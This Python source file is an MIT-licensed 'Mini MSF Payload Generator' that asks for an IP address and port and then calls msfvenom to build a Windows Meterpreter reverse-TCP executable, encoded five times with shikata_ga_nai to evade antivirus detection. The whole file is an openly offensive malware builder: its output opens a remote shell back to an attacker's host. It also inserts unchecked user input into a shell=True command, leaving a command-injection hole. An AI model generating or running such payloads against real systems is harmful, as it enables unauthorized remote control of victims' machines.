"""
MIT License

Copyright (c) 2023 Elijah Bennett (Ginsu)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

@Description 	: Generate basic payloads
@Author		: Ginsu
@Date		: 6/16/22
@Version	: 1.0
"""

### Imports
import subprocess as sp
###

__all__ = ["msf_basic"]

### Code
def msf_basic():
	print("Mini MSF Payload Generator")
	print("--------------------------")
	print("(1) Basic Windows Reverse TCP")
	op = int(input("\nOption: "))
	ip = input("IP: ")
	port = input("Port: ")
	if op == 1:
		cmd_str = "msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} -f exe --encoder x86/shikata_ga_nai -i 5 -o payload.exe".format(ip, port)
	try:
		sp.call(cmd_str, shell=True)
		print("[+] Done.")
	except:
		print("[-] Fail.")
###

if __name__ == "__main__":
	msf_basic()
